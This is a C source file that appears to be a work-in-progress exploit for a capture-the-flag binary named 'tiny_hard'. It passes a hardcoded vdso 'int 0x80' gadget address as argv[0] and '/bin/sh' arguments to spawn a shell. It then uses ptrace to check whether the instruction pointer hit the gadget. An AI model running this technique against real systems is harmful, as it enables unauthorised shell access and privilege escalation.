#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>


#define VDSO_START (0xf7755000) // changes due to ASLR, low entropy. Example start
#define int80_offest (0xb57) // remote offset to int 0x80 gadget on the vdso
// 0xf7742b57

char address[] = { 0x57, 0x2b, 0x74, 0xf7 }; // another legit address
char *ARG = "/bin/sh";


void run_bash_with_ptrace(pid_t pid) {
printf("Parents starts waiting..\n");
	int status;
	wait(&status);
printf("Wait status: %d\n", status); // special code 2943 means WE OWNED IT - landed just the right address!
printf("Now doing second wait....\n");
    
	wait(&status);
printf("Parent done waiting, Status: %d\n");
struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
if (regs.eip == 0xf7742b59){
	printf("BINGOOOOOOOOOOOOOOOOO\n\n\n\n\n\nBINGO\n");
} 
    printf("Registers values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);
	printf("EIP points to:\n");
	long text = ptrace(PTRACE_PEEKTEXT, pid, regs.eip, 0);
printf("text: %p\n", text);
}


void main(void) {

    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
    	printf("[*] Child entered\n");
    	//sleep(1);
    	//printf("Executing binary..\n");
        execl("/home/tiny_hard/tiny_hard", address, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, NULL);
        perror("execl");
    }
    else {
//        sleep(1);
	printf("[*] Parent entered. Child pid: %d\n", pid);
        run_bash_with_ptrace(pid);
    }
}
